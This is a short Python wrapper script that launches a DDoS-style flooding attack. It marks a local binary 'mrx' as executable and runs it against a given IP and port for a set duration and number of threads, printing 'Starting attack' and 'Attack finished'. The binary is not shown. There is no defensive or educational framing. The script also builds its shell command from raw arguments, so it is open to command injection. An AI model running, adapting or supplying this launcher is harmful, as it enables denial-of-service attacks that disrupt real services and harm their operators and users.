import subprocess
import sys
import os

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 main.py <ip> <port> <time> <threads>")
        sys.exit(1)
    
    ip, port, duration, threads = sys.argv[1:5]
    
    if os.path.exists("mrx"):
        os.chmod("mrx", 0o755)
    
    print(f"Starting attack on {ip}:{port} with {threads} threads")
    
    subprocess.run(f"./mrx {ip} {port} {duration} 24 {threads}", shell=True)
    
    print("Attack finished")

if __name__ == "__main__":
    main()